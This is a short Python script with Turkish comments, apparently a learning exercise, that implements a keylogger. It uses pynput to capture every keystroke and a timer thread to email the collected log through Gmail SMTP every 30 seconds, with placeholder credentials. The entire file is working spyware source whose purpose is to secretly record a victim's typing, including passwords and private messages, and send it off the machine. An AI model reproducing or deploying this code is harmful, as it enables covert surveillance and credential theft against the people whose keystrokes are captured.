import pynput.keyboard
#from pynput import keyboard
import smtplib
import threading

log = ""

def callback_fuction(key): ## ---> Klavye'ye basıldığında key değişkeni yerine geçecek

    global log

    try:

        log = log + str(key.char)
        # log = log + key.char.encode("utf-8") ---> Veriye dönüştürme.

    except AttributeError:

        if key == key.space:

            log = log + " "

        if key == key.ctrl:
            
            log = log + " " + "ctrl" + " "
        
        if key == key.alt:

            log = log + " " + "alt" + " "

        if key == key.tab:

            log = log + " " + "tab" + " "

        if key == key.enter:

            log = log + " " + "enter" + " "

        print(log)

def send_mail(email, password, message):

    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    
    email_server.starttls()
    
    email_server.login(email, password)
    
    email_server.sendmail(email, email, message)
    
    email_server.quit()

def thread_function():
    global log
    
    send_mail("email", "password", log)

    log = ""

    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press = callback_fuction)

#threading 
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
